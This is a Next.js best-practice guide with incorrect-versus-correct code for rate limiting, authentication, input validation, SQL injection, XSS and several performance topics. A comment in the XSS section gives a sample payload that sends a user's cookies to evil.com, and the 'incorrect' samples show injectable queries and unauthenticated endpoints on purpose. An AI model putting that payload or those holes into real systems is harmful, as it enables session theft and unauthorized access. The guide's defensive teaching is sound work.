Next.js provides zero built-in rate limiting. Every login endpoint, password reset, signup form, OTP verification, and sensitive Server Action is vulnerable to brute force attacks by default. Credential stuffing is the #1 attack vector against authentication systems.

Without rate limiting, an attacker can:
- Try thousands of password combinations per minute
- Enumerate valid usernames via timing differences
- Exhaust AI/API credits by spamming expensive endpoints
- DoS your app by flooding Server Actions

**Incorrect (no rate limiting):**

```typescript
// app/api/auth/login/route.ts
// ❌ No rate limiting — attacker can try millions of passwords
export async function POST(request: NextRequest) {
  const { email, password } = await request.json()
  const user = await db.user.findUnique({ where: { email } })
  if (!user || !await verifyPassword(password, user.passwordHash)) {
    return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 })
  }
  // ... create session
}
```

```typescript
// ❌ Server Action with no rate limiting on expensive operation
'use server'
export async function analyzeCode(code: string) {
  const result = await callAI(code) // Costs money per call!
  return result
}
```

**Correct (rate limiting with Upstash Redis):**

```typescript
// lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit'
import { Redis } from '@upstash/redis'

const redis = Redis.fromEnv()

// Different limiters for different sensitivity levels
export const authLimiter = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(5, '15 m'), // 5 attempts per 15 minutes
  prefix: 'rl:auth',
})

export const apiLimiter = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(60, '1 m'), // 60 requests per minute
  prefix: 'rl:api',
})

export const expensiveLimiter = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, '1 h'), // 10 per hour
  prefix: 'rl:expensive',
})
```

```typescript
// app/api/auth/login/route.ts
import { authLimiter } from '@/lib/rate-limit'

export async function POST(request: NextRequest) {
  // Rate limit by IP (or email for account-level limiting)
  const ip = request.headers.get('x-forwarded-for') ?? 'unknown'
  const { success, remaining, reset } = await authLimiter.limit(ip)

  if (!success) {
    return NextResponse.json(
      { error: 'Too many attempts. Try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': String(Math.ceil((reset - Date.now()) / 1000)),
          'X-RateLimit-Remaining': String(remaining),
        },
      }
    )
  }

  const { email, password } = await request.json()
  // ... validate credentials
}
```

```typescript
// ✅ Rate limiting in Server Actions
'use server'

import { expensiveLimiter } from '@/lib/rate-limit'
import { auth } from '@/lib/auth'
import { headers } from 'next/headers'

export async function analyzeCode(rawInput: unknown) {
  const session = await auth()
  if (!session?.user) throw new Error('Unauthorized')

  // Rate limit by user ID for authenticated actions
  const { success } = await expensiveLimiter.limit(session.user.id)
  if (!success) {
    return { error: 'Rate limit exceeded. Please wait before trying again.' }
  }

  // ... proceed with expensive operation
}
```

**Lightweight alternative (in-memory, for single-instance deployments):**

```typescript
// lib/rate-limit-memory.ts — no external dependencies
const attempts = new Map<string, { count: number; resetAt: number }>()

export function checkRateLimit(key: string, maxAttempts: number, windowMs: number) {
  const now = Date.now()
  const entry = attempts.get(key)

  if (!entry || now > entry.resetAt) {
    attempts.set(key, { count: 1, resetAt: now + windowMs })
    return { success: true, remaining: maxAttempts - 1 }
  }

  if (entry.count >= maxAttempts) {
    return { success: false, remaining: 0, resetAt: entry.resetAt }
  }

  entry.count++
  return { success: true, remaining: maxAttempts - entry.count }
}
```

**Detection hints:**

```bash
# Find auth endpoints without rate limiting
grep -rn "login\|signin\|signup\|reset-password\|verify-otp" src/app/api --include="*.ts" -l | \
  xargs grep -L "rateLimit\|limiter\|Ratelimit\|rateLimiter"
# Find server actions doing expensive operations without limits
grep -rn "callAI\|openai\|anthropic\|stripe" src/ --include="*.ts" --include="*.tsx" -l | \
  xargs grep -L "rateLimit\|limiter"
```

Reference: [Upstash Rate Limiting](https://upstash.com/docs/oss/sdks/ts/ratelimit/overview) · [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)

---

## Authenticate Route Handlers Like Server Actions

**Impact: CRITICAL (prevents unauthorized access to API endpoints that bypass middleware)**

App Router route handlers (`app/api/.../route.ts`) are publicly accessible HTTP endpoints. Each exported function — `GET`, `POST`, `PUT`, `DELETE` — resolves independently and must verify authentication and authorization on its own. Middleware and layout-level auth checks do not protect route handlers because:

1. Route handlers are resolved independently from the page component tree
2. Middleware can be bypassed (see CVE-2025-29927)
3. Direct HTTP requests skip the UI entirely — there is no layout wrapping an API call

This is the route handler equivalent of `sec-server-action-auth`. The same principle applies: treat every route handler as a public-facing API endpoint.

**Incorrect (no auth — anyone can call this):**

```typescript
// app/api/users/[id]/route.ts
// ❌ Assumes middleware already checked auth
export async function GET(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  const user = await db.user.findUnique({ where: { id: params.id } })
  return NextResponse.json(user) // Leaks any user's data
}

export async function DELETE(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  await db.user.delete({ where: { id: params.id } }) // Anyone can delete any user
  return NextResponse.json({ success: true })
}
```

**Correct (auth in every handler):**

```typescript
// app/api/users/[id]/route.ts
import { auth } from '@/lib/auth'

export async function GET(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await auth()
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  // Authorization: users can only read their own data (or admins can read any)
  if (session.user.id !== params.id && session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  const user = await db.user.findUnique({ where: { id: params.id } })
  if (!user) {
    return NextResponse.json({ error: 'Not found' }, { status: 404 })
  }

  return NextResponse.json(user)
}

export async function DELETE(
  request: NextRequest,
  { params }: { params: { id: string } }
) {
  const session = await auth()
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  if (session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  await db.user.delete({ where: { id: params.id } })
  return NextResponse.json({ success: true })
}
```

**Extract a reusable auth guard to reduce boilerplate:**

```typescript
// lib/api-auth.ts
import { auth } from '@/lib/auth'
import { NextResponse } from 'next/server'

export async function requireAuth(roles?: string[]) {
  const session = await auth()
  if (!session?.user) {
    return { error: NextResponse.json({ error: 'Unauthorized' }, { status: 401 }) }
  }
  if (roles && !roles.includes(session.user.role)) {
    return { error: NextResponse.json({ error: 'Forbidden' }, { status: 403 }) }
  }
  return { session }
}

// Usage in route handler:
export async function DELETE(request: NextRequest, { params }) {
  const { session, error } = await requireAuth(['admin'])
  if (error) return error
  // ... safe to proceed
}
```

**Detection hints:**

```bash
# Find route handlers missing auth checks
grep -rn "export async function GET\|export async function POST\|export async function PUT\|export async function DELETE" src/ --include="*.ts" -l | \
  xargs grep -L "auth\|session\|getServerSession\|requireAuth"
```

Reference: [Next.js Route Handlers](https://nextjs.org/docs/app/building-your-application/routing/route-handlers) · [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

---

## Authenticate Server Actions Like API Routes

**Impact: CRITICAL (prevents unauthorized access to server mutations)**

Server Actions (`"use server"`) are exposed as public HTTP endpoints. Anyone can call them directly — they are **not** protected by middleware, layout guards, or page-level auth checks. Always verify authentication and authorization **inside** each Server Action.

This is the #1 security mistake in Next.js applications. The Next.js docs explicitly state: "Treat Server Actions with the same security considerations as public-facing API endpoints."

**Incorrect (no authentication — anyone can call this):**

```typescript
'use server'

export async function deleteUser(userId: string) {
  // ❌ No auth check — this is a public endpoint!
  await db.user.delete({ where: { id: userId } })
  return { success: true }
}
```

**Correct (authentication + authorization inside the action):**

```typescript
'use server'

import { auth } from '@/lib/auth'

export async function deleteUser(userId: string) {
  const session = await auth()

  if (!session?.user) {
    throw new Error('Unauthorized')
  }

  // Check authorization: only admins or the user themselves
  if (session.user.role !== 'admin' && session.user.id !== userId) {
    throw new Error('Forbidden')
  }

  await db.user.delete({ where: { id: userId } })
  return { success: true }
}
```

**With input validation (belt + suspenders):**

```typescript
'use server'

import { auth } from '@/lib/auth'
import { z } from 'zod'

const schema = z.object({
  userId: z.string().uuid(),
})

export async function deleteUser(input: unknown) {
  const { userId } = schema.parse(input)  // validate first
  const session = await auth()             // authenticate
  if (!session?.user) throw new Error('Unauthorized')
  if (session.user.role !== 'admin' && session.user.id !== userId) {
    throw new Error('Forbidden')           // authorize
  }

  await db.user.delete({ where: { id: userId } })
  return { success: true }
}
```

**Detection hints:**

```bash
# Find server actions without auth checks
grep -rn '"use server"' src/ --include="*.ts" --include="*.tsx" -l | \
  xargs grep -L "auth\|session\|getServerSession\|verifySession"
```

Reference: [Next.js Authentication Guide](https://nextjs.org/docs/app/guides/authentication)

---

## Validate All Server Action Inputs at the Boundary

**Impact: CRITICAL (prevents remote code execution and type confusion from untrusted deserialized input)**

Server Action arguments arrive over the network via the React Server Components Flight protocol. Even though TypeScript shows typed parameters, the actual values are deserialized from an untrusted HTTP POST body — an attacker can send anything.

CVE-2025-55182 (CVSS 10.0, "React2Shell") demonstrated that the RSC decoder could be exploited to achieve unauthenticated remote code execution via crafted Flight payloads. While patched in React 19.0.1/19.1.2/19.2.1 and Next.js 15.0.5+, the fundamental principle remains: **never trust deserialized input. Validate every Server Action argument before use.**

Your existing `sec-server-action-auth` rule covers *who* can call actions. This rule covers *what* they can send.

**Incorrect (trusting typed parameters):**

```typescript
'use server'

// ❌ TypeScript types don't exist at runtime — rawInput could be anything
export async function updateProfile(data: { name: string; email: string }) {
  await db.user.update({
    where: { id: data.id }, // data.id could be injected
    data: { name: data.name, email: data.email },
  })
}

// ❌ Passing unvalidated input to shell/eval-adjacent functions
export async function generateReport(template: string, params: object) {
  const html = renderTemplate(template, params) // template injection risk
  return html
}
```

**Correct (validate at the boundary with Zod):**

```typescript
'use server'

import { z } from 'zod'
import { auth } from '@/lib/auth'

const UpdateProfileSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
})

export async function updateProfile(rawInput: unknown) {
  const session = await auth()
  if (!session?.user) throw new Error('Unauthorized')

  // Validate THEN use — never skip this step
  const { name, email } = UpdateProfileSchema.parse(rawInput)

  await db.user.update({
    where: { id: session.user.id }, // Use session ID, not user input
    data: { name, email },
  })
}
```

```typescript
'use server'

import { z } from 'zod'

// ✅ Constrain inputs to known-safe values
const ReportSchema = z.object({
  templateName: z.enum(['monthly', 'quarterly', 'annual']), // Allowlist, not freeform
  startDate: z.string().date(),
  endDate: z.string().date(),
})

export async function generateReport(rawInput: unknown) {
  const { templateName, startDate, endDate } = ReportSchema.parse(rawInput)
  const template = templates[templateName] // Safe lookup from allowlist
  return renderTemplate(template, { startDate, endDate })
}
```

**Key principles:**

1. **Type the parameter as `unknown`** — forces validation before use
2. **Validate with Zod/Valibot at the top of every action** — before any logic
3. **Use allowlists for enums** — `z.enum()` instead of `z.string()` for constrained values
4. **Derive IDs from the session** — never trust user-supplied entity IDs for ownership
5. **Never pass raw input to eval, templates, or shell commands**

**Detection hints:**

```bash
# Find server actions without input validation
grep -rn '"use server"' src/ --include="*.ts" --include="*.tsx" -l | \
  xargs grep -L "parse\|safeParse\|validate\|schema\|Schema"
# Find server actions accepting typed params instead of unknown
grep -rn "export async function.*({" src/ --include="*.ts" --include="*.tsx" | grep -v "unknown\|FormData"
```

Reference: [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) · [React Security Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components) · [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

---

## Never Build Database Queries with String Concatenation

**Impact: CRITICAL (prevents SQL injection and NoSQL injection attacks)**

Constructing database queries by concatenating or interpolating user input creates injection vulnerabilities. This applies to raw SQL, ORM queries with raw segments, and NoSQL operations. Always use parameterized queries or ORM methods that handle escaping.

**Incorrect (string interpolation in raw SQL):**

```typescript
// ❌ Direct interpolation — classic SQL injection vector
export async function getUser(name: string) {
  const result = await prisma.$queryRaw`
    SELECT * FROM users WHERE name = '${name}'
  `
  return result
}

// ❌ String concatenation in query builder
export async function searchProducts(term: string) {
  const query = `SELECT * FROM products WHERE name LIKE '%${term}%'`
  const result = await db.execute(query)
  return result
}
```

**Correct (parameterized queries):**

```typescript
// ✅ Prisma tagged template (auto-parameterized)
export async function getUser(name: string) {
  const result = await prisma.$queryRaw(
    Prisma.sql`SELECT * FROM users WHERE name = ${name}`
  )
  return result
}

// ✅ Better: use the ORM's query builder
export async function getUser(name: string) {
  return prisma.user.findFirst({
    where: { name },
  })
}

// ✅ Drizzle parameterized query
export async function searchProducts(term: string) {
  return db
    .select()
    .from(products)
    .where(like(products.name, `%${term}%`))
}
```

**Also watch for Supabase:**

```typescript
// ❌ String interpolation in Supabase RPC
const { data } = await supabase.rpc('search_users', {
  query: `%${userInput}%`  // Could be safe depending on the function, but risky pattern
})

// ✅ Use Supabase query builder
const { data } = await supabase
  .from('users')
  .select('*')
  .ilike('name', `%${userInput}%`)  // Properly parameterized by the SDK
```

**Detection hints:**

```bash
# Find potential SQL injection patterns
grep -rn '\$queryRaw`' src/ --include="*.ts" --include="*.tsx" | grep '\${'
grep -rn "execute(" src/ --include="*.ts" | grep -E "(\+|concat|\`)"
grep -rn "query(" src/ --include="*.ts" | grep -E "(\+|concat|\`)"
```

Reference: [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) · [Prisma Raw Queries](https://www.prisma.io/docs/orm/prisma-client/using-raw-sql/raw-queries)

---

## Sanitize All HTML Before Using dangerouslySetInnerHTML

**Impact: CRITICAL (prevents cross-site scripting attacks)**

React escapes content by default, but `dangerouslySetInnerHTML` bypasses this protection entirely. If the HTML comes from user input, a database, a CMS, or any external source, it must be sanitized before rendering. Unsanitized HTML enables attackers to inject scripts that steal cookies, session tokens, or perform actions as the user.

**Incorrect (rendering unsanitized external HTML):**

```tsx
// ❌ CMS content rendered without sanitization
export function BlogPost({ content }: { content: string }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />
}

// ❌ User-generated content rendered raw
export function Comment({ body }: { body: string }) {
  return <div dangerouslySetInnerHTML={{ __html: body }} />
  // If body = '<img src=x onerror="document.location=`https://evil.com?c=${document.cookie}`">'
  // ...the attacker now has the user's cookies
}

// ❌ Markdown-to-HTML without sanitization
import { marked } from 'marked'
export function MarkdownPreview({ markdown }: { markdown: string }) {
  const html = marked(markdown)
  return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```

**Correct (sanitize before rendering):**

```tsx
// ✅ Sanitize with DOMPurify (most popular, well-maintained)
import DOMPurify from 'isomorphic-dompurify'

export function BlogPost({ content }: { content: string }) {
  const clean = DOMPurify.sanitize(content)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Sanitize markdown output
import { marked } from 'marked'
import DOMPurify from 'isomorphic-dompurify'

export function MarkdownPreview({ markdown }: { markdown: string }) {
  const rawHtml = marked(markdown)
  const clean = DOMPurify.sanitize(rawHtml)
  return <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// ✅ Best: use a React markdown renderer that doesn't use dangerouslySetInnerHTML
import ReactMarkdown from 'react-markdown'

export function MarkdownPreview({ markdown }: { markdown: string }) {
  return <ReactMarkdown>{markdown}</ReactMarkdown>
}
```

**Detection hints:**

```bash
# Find all uses of dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
# Check if DOMPurify or sanitize is imported nearby
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" -l | \
  xargs grep -L "DOMPurify\|sanitize\|purify"
```

Reference: [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · [DOMPurify](https://github.com/cure53/DOMPurify)

---

## Avoid Barrel File Imports in Client Components

**Impact: HIGH (200-800ms import cost reduction, faster builds and cold starts)**

Barrel files (`index.ts` that re-exports everything) force bundlers to load entire libraries even when you only use one export. Icon and component libraries can have thousands of re-exports, adding megabytes to your client bundle. This is especially costly in Client Components where every byte ships to the browser.

**Incorrect (imports entire library via barrel file):**

```tsx
'use client'

// ❌ Loads all 1,500+ icons even though you use 3
import { Check, X, Menu } from 'lucide-react'

// ❌ Loads entire MUI library
import { Button, TextField } from '@mui/material'

// ❌ Loads all of lodash
import { debounce, throttle } from 'lodash'
```

**Correct (direct deep imports):**

```tsx
'use client'

// ✅ Loads only the 3 icons you need
import Check from 'lucide-react/dist/esm/icons/check'
import X from 'lucide-react/dist/esm/icons/x'
import Menu from 'lucide-react/dist/esm/icons/menu'

// ✅ Direct component imports
import Button from '@mui/material/Button'
import TextField from '@mui/material/TextField'

// ✅ Individual lodash function imports
import debounce from 'lodash/debounce'
import throttle from 'lodash/throttle'
```

**Best (Next.js optimizePackageImports):**

```javascript
// next.config.js — let Next.js handle it automatically
module.exports = {
  experimental: {
    optimizePackageImports: [
      'lucide-react',
      '@mui/material',
      '@mui/icons-material',
      'lodash',
      'date-fns',
      'react-icons',
      '@radix-ui/react-icons',
    ],
  },
}

// Now barrel imports are automatically tree-shaken at build time:
import { Check, X, Menu } from 'lucide-react' // ✅ Only loads 3 icons
```

**Commonly affected libraries:** `lucide-react`, `@mui/material`, `@mui/icons-material`, `@tabler/icons-react`, `react-icons`, `@headlessui/react`, `@radix-ui/*`, `lodash`, `ramda`, `date-fns`, `rxjs`.

**Detection hints:**

```bash
# Find barrel imports of known heavy libraries in client components
grep -rn "'use client'" src/ --include="*.tsx" -l | \
  xargs grep -l "from 'lucide-react'\|from '@mui/material'\|from 'lodash'\|from 'react-icons'"
```

Reference: [How we optimized package imports in Next.js](https://vercel.com/blog/how-we-optimized-package-imports-in-next-js)

---

## Use Dynamic Imports for Heavy Client Components

**Impact: HIGH (reduces initial JavaScript bundle by deferring heavy libraries until needed)**

Importing heavy client-side libraries at the top of a file forces the entire library into the initial bundle — even if the component is below the fold, behind a tab, or conditionally rendered. `next/dynamic` (Next.js's wrapper around `React.lazy`) code-splits these imports so they load only when needed.

Common offenders: chart libraries (Chart.js, Recharts), rich text editors (TipTap, Slate), map libraries (Leaflet, Mapbox), PDF viewers, syntax highlighters, and markdown renderers.

**Incorrect (everything in the initial bundle):**

```tsx
'use client'

// ❌ 200KB+ loaded immediately even if chart is below the fold
import { Chart } from 'chart.js/auto'
import { Bar } from 'react-chartjs-2'

// ❌ 500KB+ rich text editor loaded on a page where most users just read
import { Editor } from '@tiptap/react'
import StarterKit from '@tiptap/starter-kit'

// ❌ Heavy map library loaded on every page load
import { MapContainer, TileLayer, Marker } from 'react-leaflet'

export default function AnalyticsPage() {
  return (
    <div>
      <h1>Dashboard</h1>
      <Bar data={chartData} />
      <Editor extensions={[StarterKit]} />
      <MapContainer center={[51.505, -0.09]} zoom={13}>
        <TileLayer url="..." />
      </MapContainer>
    </div>
  )
}
```

**Correct (dynamic imports with loading states):**

```tsx
'use client'

import dynamic from 'next/dynamic'

// ✅ Code-split heavy components — loaded only when rendered
const BarChart = dynamic(
  () => import('react-chartjs-2').then(mod => ({ default: mod.Bar })),
  {
    loading: () => <div className="h-64 animate-pulse bg-gray-100 rounded" />,
    ssr: false, // Chart.js requires browser APIs
  }
)

const RichEditor = dynamic(
  () => import('@/components/RichEditor'),
  {
    loading: () => <div className="h-48 animate-pulse bg-gray-100 rounded" />,
    ssr: false, // Editor requires DOM APIs
  }
)

const Map = dynamic(
  () => import('@/components/LeafletMap'),
  {
    loading: () => <div className="h-96 animate-pulse bg-gray-100 rounded" />,
    ssr: false, // Leaflet requires window
  }
)

export default function AnalyticsPage() {
  return (
    <div>
      <h1>Dashboard</h1>
      <BarChart data={chartData} />
      <RichEditor />
      <Map center={[51.505, -0.09]} zoom={13} />
    </div>
  )
}
```

```tsx
// ✅ Conditionally load heavy components
'use client'

import dynamic from 'next/dynamic'
import { useState } from 'react'

const PdfViewer = dynamic(() => import('@/components/PdfViewer'), {
  ssr: false,
})

export default function DocumentPage({ document }) {
  const [showPdf, setShowPdf] = useState(false)

  return (
    <div>
      <h1>{document.title}</h1>
      <p>{document.summary}</p>

      {/* PDF viewer only loads when user clicks the button */}
      <button onClick={() => setShowPdf(true)}>View PDF</button>
      {showPdf && <PdfViewer url={document.pdfUrl} />}
    </div>
  )
}
```

**When to use `ssr: false`:**

- Libraries that access `window`, `document`, or browser-only APIs
- Canvas-based libraries (charts, maps, drawing)
- Libraries with large WASM modules
- Components that are purely interactive (no SEO value from SSR)

**When NOT to dynamically import:**

- Small components (< 5KB) — the overhead of a separate chunk isn't worth it
- Above-the-fold content critical for LCP
- Components rendered on every page load

**Detection hints:**

```bash
# Find heavy library imports in client components
grep -rn "'use client'" src/ --include="*.tsx" -l | \
  xargs grep -l "chart\|editor\|leaflet\|mapbox\|pdf\|monaco\|codemirror\|markdown"
```

Reference: [Next.js Lazy Loading](https://nextjs.org/docs/app/building-your-application/optimizing/lazy-loading) · [React.lazy](https://react.dev/reference/react/lazy)

---

## Use next/font Instead of External Font Loading

**Impact: MEDIUM (eliminates font-related layout shift and removes external network dependency)**

Loading fonts from Google Fonts or other CDNs requires DNS lookups, TCP connections, and TLS handshakes to external servers — adding 100-300ms to font loading. During this time, text either flashes from a fallback font (FOUT) or is invisible (FOIT), both causing Cumulative Layout Shift.

`next/font` downloads fonts at build time, self-hosts them from your own domain, and automatically generates `size-adjust` CSS to match the fallback font's metrics — eliminating layout shift entirely.

**Incorrect (external font loading):**

```tsx
// ❌ External CSS link in layout — render-blocking, causes CLS
// app/layout.tsx
export default function RootLayout({ children }) {
  return (
    <html>
      <head>
        <link
          href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
          rel="stylesheet"
        />
      </head>
      <body style={{ fontFamily: 'Inter, sans-serif' }}>{children}</body>
    </html>
  )
}
```

```css
/* ❌ @import in CSS — blocks rendering until font CSS is downloaded */
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');

body {
  font-family: 'Inter', sans-serif;
}
```

```tsx
// ❌ Self-hosted but without size-adjust — still causes layout shift
<style>{`
  @font-face {
    font-family: 'CustomFont';
    src: url('/fonts/custom.woff2');
    font-display: swap; /* Text visible immediately, but shifts when font loads */
  }
`}</style>
```

**Correct (next/font with automatic optimization):**

```tsx
// app/layout.tsx
// ✅ Google Fonts — downloaded at build time, self-hosted
import { Inter } from 'next/font/google'

const inter = Inter({
  subsets: ['latin'],
  display: 'swap',
  // Automatically generates size-adjust for zero CLS
})

export default function RootLayout({ children }) {
  return (
    <html lang="en" className={inter.className}>
      <body>{children}</body>
    </html>
  )
}
```

```tsx
// ✅ Multiple weights and variable fonts
import { Inter, Fira_Code } from 'next/font/google'

const inter = Inter({
  subsets: ['latin'],
  variable: '--font-inter', // CSS variable for Tailwind
})

const firaCode = Fira_Code({
  subsets: ['latin'],
  variable: '--font-mono',
})

export default function RootLayout({ children }) {
  return (
    <html lang="en" className={`${inter.variable} ${firaCode.variable}`}>
      <body>{children}</body>
    </html>
  )
}
```

```tsx
// ✅ Local/custom fonts
import localFont from 'next/font/local'

const customFont = localFont({
  src: [
    { path: './fonts/Custom-Regular.woff2', weight: '400', style: 'normal' },
    { path: './fonts/Custom-Bold.woff2', weight: '700', style: 'normal' },
  ],
  variable: '--font-custom',
})
```

```javascript
// tailwind.config.js — use the CSS variables
module.exports = {
  theme: {
    extend: {
      fontFamily: {
        sans: ['var(--font-inter)', 'system-ui', 'sans-serif'],
        mono: ['var(--font-mono)', 'monospace'],
      },
    },
  },
}
```

**Detection hints:**

```bash
# Find external font loading
grep -rn "fonts.googleapis.com\|fonts.google.com" src/ --include="*.tsx" --include="*.css" --include="*.html"
# Find @import font rules in CSS
grep -rn "@import.*font" src/ --include="*.css" --include="*.scss"
```

Reference: [Next.js Font Optimization](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) · [Web.dev CLS and Fonts](https://web.dev/articles/optimize-cls#web-fonts)

---

## Use next/image Instead of Raw img Tags

**Impact: HIGH (40-80% image size reduction and elimination of Cumulative Layout Shift)**

Images are typically the largest assets on a web page. Raw `<img>` tags force the browser to download full-size images regardless of viewport, cause layout shift (CLS) when they load, and serve unoptimized formats. The `next/image` component provides:

- **Automatic format conversion** — serves WebP/AVIF when the browser supports it
- **Responsive sizing** — generates multiple sizes and uses `srcset` for the right one
- **Lazy loading by default** — only loads images when they enter the viewport
- **Layout shift prevention** — reserves space based on dimensions, preventing CLS
- **Blur placeholders** — shows a blurred preview while the full image loads

**Incorrect (raw img tags):**

```tsx
// ❌ Full-size image downloaded on every device, causes layout shift
export default function ProductCard({ product }) {
  return (
    <div>
      <img src={product.imageUrl} alt={product.name} />
      <h3>{product.name}</h3>
    </div>
  )
}

// ❌ CSS background images skip all optimization
<div style={{ backgroundImage: `url(${hero.url})` }} />

// ❌ Eager loading large images in below-the-fold content
<img src="/huge-banner.jpg" alt="Banner" loading="eager" />
```

**Correct (next/image with proper configuration):**

```tsx
import Image from 'next/image'

// ✅ Local images — dimensions inferred automatically
export default function ProductCard({ product }) {
  return (
    <div>
      <Image
        src={product.imageUrl}
        alt={product.name}
        width={400}
        height={300}
        sizes="(max-width: 768px) 100vw, 400px"
      />
      <h3>{product.name}</h3>
    </div>
  )
}

// ✅ Hero/LCP images — set priority to preload
<Image
  src="/hero.jpg"
  alt="Welcome to our store"
  width={1200}
  height={600}
  priority              // Preloads the image, disables lazy loading
  sizes="100vw"
  placeholder="blur"    // Shows blurred version while loading
  blurDataURL={blurHash} // Base64 blur placeholder
/>

// ✅ Fill mode for unknown dimensions (e.g., user uploads)
<div className="relative aspect-video">
  <Image
    src={user.avatarUrl}
    alt={user.name}
    fill
    className="object-cover"
    sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
  />
</div>
```

**Configure remote image domains:**

```javascript
// next.config.js
module.exports = {
  images: {
    remotePatterns: [
      {
        protocol: 'https',
        hostname: 'images.example.com',
        pathname: '/uploads/**',
      },
    ],
  },
}
```

**Key rules:**

1. **Always provide `width` and `height`** (or use `fill`) — this prevents CLS
2. **Always provide `sizes`** — tells the browser which image size to download at each viewport width
3. **Set `priority` on LCP images** — above-the-fold hero images, product images on landing pages
4. **Use `placeholder="blur"`** for a better loading experience on large images
5. **Configure `remotePatterns`** — not `domains` (deprecated) — for external images

**Detection hints:**

```bash
# Find raw img tags that should use next/image
grep -rn "<img " src/ --include="*.tsx" --include="*.jsx" | grep -v "node_modules"
# Find Image components missing sizes prop
grep -rn "<Image" src/ --include="*.tsx" -A 5 | grep -B 3 "width=" | grep -L "sizes="
```

Reference: [Next.js Image Optimization](https://nextjs.org/docs/app/building-your-application/optimizing/images) · [Web.dev CLS Guide](https://web.dev/articles/cls)

---

## Use Stable, Unique Keys for List Items (Never Index)

**Impact: MEDIUM (prevents incorrect component state, UI corruption, and inefficient re-renders in lists)**

React uses `key` props to track which list items changed, were added, or removed. When you use array indices (`key={index}`), React associates state with the position, not the item. If the list is reordered, filtered, or has items added/removed at the beginning, input values stick to the wrong items, animations break, and components re-mount unnecessarily.

**Incorrect (index as key):**

```tsx
// ❌ Index keys cause state to stick to the wrong item when list changes
function TodoList({ todos, onRemove }) {
  return (
    <ul>
      {todos.map((todo, index) => (
        <li key={index}> {/* If todo[0] is removed, todo[1] gets todo[0]'s state */}
          <input defaultValue={todo.text} />
          <button onClick={() => onRemove(todo.id)}>Remove</button>
        </li>
      ))}
    </ul>
  )
}

// ❌ Random keys force React to re-mount everything every render
{items.map(item => (
  <Card key={Math.random()} item={item} /> // Destroys and recreates on every render!
))}

// ❌ Non-unique keys cause siblings to be confused
{users.map(user => (
  <UserCard key={user.name} user={user} /> // Names aren't unique!
))}
```

**Correct (stable, unique keys):**

```tsx
// ✅ Use the item's unique identifier
function TodoList({ todos, onRemove }) {
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}> {/* Stable: follows the item, not the position */}
          <input defaultValue={todo.text} />
          <button onClick={() => onRemove(todo.id)}>Remove</button>
        </li>
      ))}
    </ul>
  )
}

// ✅ Database IDs, UUIDs, or slugs are ideal keys
{posts.map(post => <PostCard key={post.id} post={post} />)}
{products.map(product => <ProductRow key={product.sku} product={product} />)}
{pages.map(page => <NavLink key={page.slug} href={page.slug} />)}

// ✅ Composite key when no single unique field exists
{events.map(event => (
  <EventRow key={`${event.date}-${event.venue}-${event.time}`} event={event} />
))}
```

**When `key={index}` is acceptable:**

- Static lists that never reorder, filter, or have items added/removed
- Lists of display-only items with no internal state (no inputs, no animations)
- Simple lists like `['Home', 'About', 'Contact'].map((label, i) => <span key={i}>{label}</span>)`

**The symptom to watch for:** users report that "input values jump around" or "the wrong item gets deleted" after reordering or filtering a list. This is almost always an index key bug.

**Detection hints:**

```bash
# Find index used as key
grep -rn "key={index}\|key={i}\|key={idx}" src/ --include="*.tsx" --include="*.jsx"
# Find .map without key (React will warn, but catch it early)
grep -rn "\.map(" src/ --include="*.tsx" -A 2 | grep -v "key="
```

Reference: [React Docs: Why does React need keys?](https://react.dev/learn/rendering-lists#why-does-react-need-keys)

---

## Eliminate N+1 Database Queries

**Impact: CRITICAL (10-100× query reduction, prevents database overload)**

The N+1 query problem occurs when code fetches a list of items (1 query), then loops through each item to fetch related data (N queries). This is the most common performance killer in web applications and scales linearly with data size — 100 users = 101 queries.

**Incorrect (N+1 — one query per user in the loop):**

```typescript
// ❌ 1 query to get users + N queries to get posts
export async function getUsersWithPosts() {
  const users = await prisma.user.findMany()

  const usersWithPosts = await Promise.all(
    users.map(async (user) => {
      const posts = await prisma.post.findMany({
        where: { authorId: user.id },
      })
      return { ...user, posts }
    })
  )

  return usersWithPosts
}
// 100 users = 101 database queries 💀
```

**Correct (single query with include/join):**

```typescript
// ✅ Single query with eager loading
export async function getUsersWithPosts() {
  return prisma.user.findMany({
    include: {
      posts: true,
    },
  })
}
// 100 users = 1-2 database queries ✅
```

